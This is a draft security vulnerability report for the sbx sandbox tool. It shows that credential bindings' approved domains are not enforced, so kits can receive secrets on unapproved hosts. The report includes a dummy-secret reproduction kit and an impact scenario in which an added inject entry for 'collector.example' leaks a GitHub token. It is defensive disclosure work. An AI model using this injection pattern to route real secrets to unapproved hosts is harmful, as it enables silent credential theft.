<!--
DRAFT for review. Not filed.
Intended destination: the sbx issue tracker (docker/sbx-releases, or the internal tracker for security reports).
Because this lets a kit send a stored secret to hosts the user never approved, consider reporting it
privately through Docker's security channel first instead of as a public issue.
Before filing: re-run the repro on the current sbx release, and paste the actual header echo output
into "Observed" (the evidence below comes from the Kit Maker §1.1 experiment notes).
-->

# Credential binding domains aren't enforced: secrets are injected into kit domains the user never approved

**sbx version:** v0.48.0 (`5caf923e0587d376848f6f388eca3e0f5ca00e2d`), local
sandboxes, macOS
**Area:** credentials / bindings / proxy injection (`credential@1`)
**Severity (proposed):** high. A stored secret can be sent to hosts that
are absent from the user's binding, with no prompt and no warning, and it
also happens after the user explicitly declines.

## Summary

A credential binding in `~/.config/sbx/credentials.yaml` records which
**domains** the user approved for a service's secret. The docs and the
interactive prompt both present those domains as the approval boundary:
*"Allow this API key's secret value to be sent to these domains? (y/N)"*.

In practice the proxy only checks whether *a binding exists for the
service*. It then injects the secret into **every** `inject` domain the kit
declares, including domains that were never approved. This happens:

1. on a **non-interactive** create (`--detach`, or `--force` without a TTY),
   with **no warning at all**, and
2. on an **interactive** create where the user answers **"No, start without
   them"** at the credential prompt. `credentials.yaml` correctly stays
   unchanged, but the secret is still injected into the unapproved domains.

A kit controls both its `inject` list and its network allow-list, so the
network policy gives no protection here. Any kit, or any new revision of a
kit the user already trusts, can add a domain and receive the user's
existing secret for that service (for example `github`) without the user's
approval.

## Steps to reproduce

Use a dummy secret, never a real one.

1. Store a dummy secret and a binding that approves **one** domain:

   ```sh
   printf 'kmtest-dummy-value' | sbx secret set kmtest
   ```

   `~/.config/sbx/credentials.yaml`:

   ```yaml
   bindings:
     kmtest:
       apiKey:
         domains: [httpbin.org]
   ```

2. Create a mixin kit `./kmtest-kit/kmtest.yaml` that injects the secret into
   **three** echo hosts, only one of which is in the binding:

   ```yaml
   # syntax=docker/sandbox-kit:3
   schemaVersion: "3"
   displayName: Credential binding probe
   kind: mixin
   capabilities:
     - type: com.docker.sandbox/network-policy@2
       config:
         runtime:
           allow: [httpbin.org, postman-echo.com, httpbingo.org]
     - type: com.docker.sandbox/credential@1
       config:
         service: kmtest
         phase: [runtime]
         apiKey:
           name: KMTEST_TOKEN
           proxyManaged: true
           inject:
             - {domain: httpbin.org,      header: X-Kmtest, format: "Bearer %s"}
             - {domain: postman-echo.com, header: X-Kmtest, format: "Bearer %s"}
             - {domain: httpbingo.org,    header: X-Kmtest, format: "Bearer %s"}
   ```

3. `sbxenv.yaml` next to it:

   ```yaml
   schemaVersion: "1"
   name: km-credprobe
   agent: sbx-kit-shell
   kits:
     - docker/sbx-kit-shell:1.0.0
     - ./kmtest-kit
   ```

4. **Case A, non-interactive:**

   ```sh
   sbx env run --force --detach
   ```

   **Case B, interactive, declining:** run `sbx env run`, approve the plan,
   and at *"This kit wants to use these credentials"* choose **"No, start
   without them"** (the default).

5. In the sandbox, check which hosts received the header:

   ```sh
   sbx exec km-credprobe sh -c '
     curl -s https://httpbin.org/headers;
     curl -s https://postman-echo.com/headers;
     curl -s https://httpbingo.org/headers'
   ```

6. Clean up: `sbx env rm`, `sbx secret rm kmtest`, and remove the `kmtest`
   binding.

## Expected

- Only `httpbin.org` (the approved domain) receives `X-Kmtest: Bearer
  kmtest-dummy-value`.
- `postman-echo.com` and `httpbingo.org` receive **no** header, and sbx says
  so, e.g. *"credential kmtest not sent to postman-echo.com, httpbingo.org:
  not approved by binding"*.
- Case A: since nobody can approve, the unapproved domains stay
  un-injected (and ideally the create fails for a required credential; see
  related issues).
- Case B: declining means **nothing** is injected for that credential, on
  any domain.

## Observed

- **Case A:** all three hosts received `X-Kmtest: Bearer <dummy secret>`.
  The run printed no warning about the unapproved domains and exited 0.
  `credentials.yaml` was unchanged.
- **Case B:** after answering "No, start without them", all three hosts
  still received the header, and `credentials.yaml` was unchanged.
- In comparison, an interactive run that **approves** the prompt
  correctly lists all three domains and writes them to the binding. So the
  domain list is known to sbx at prompt time. It just isn't used as a gate
  at injection time.

<!-- TODO before filing: paste the three curl outputs for Case A and Case B here. -->

## Impact

- **Silent secret exfiltration through kit updates.** A user approves a kit
  that sends their `github` token to `api.github.com`. A later revision (or
  a compromised publisher) adds `inject: {domain: collector.example}` plus a
  matching network allow entry. On the next create, the user's real GitHub
  token goes to `collector.example`, without a prompt in CI and even when
  the user declines interactively.
- **The approval UI is misleading.** The prompt asks the user to approve
  specific domains, and the binding file records them, but neither affects
  where the secret is sent once any binding for the service exists.
- **CI is fully exposed**, because non-interactive runs neither prompt nor
  warn.

## Suggested fix

- At injection time, intersect the kit's `inject` domains with the
  binding's approved domains for that service and mechanism. Never inject
  outside the binding.
- Treat a declined prompt as "inject nothing for this credential", not just
  "don't save the binding".
- Non-interactive runs: warn (or fail, with a strict mode) listing every
  inject domain that was skipped because the binding doesn't cover it.
- Show the inject domains in `sbx env plan`, so reviewers see where secrets
  will go before approving.

## Related (could be separate issues)

1. **A required credential with no binding doesn't fail.** `credential@1`
   says a required entry without a binding *MUST fail resolution*, but sbx
   v0.48.0 warns and creates the sandbox (exit 0) in every case, interactive
   or not. A strict mode such as `--require-credentials` would let CI fail
   fast.
2. **The sentinel is set even when nothing is wired.** `KMTEST_TOKEN=proxy-managed`
   is present in every case, including when the credential wasn't injected,
   so kit content can't detect that wiring failed. The spec says the
   sentinel *SHOULD* be set "when the credential is wired".
3. **No org-level binding policy.** There's no way to approve "kits from
   `docker.io/acme/*` may use `github` on these domains" once for an
   organisation. Today every developer and CI runner approves individually.
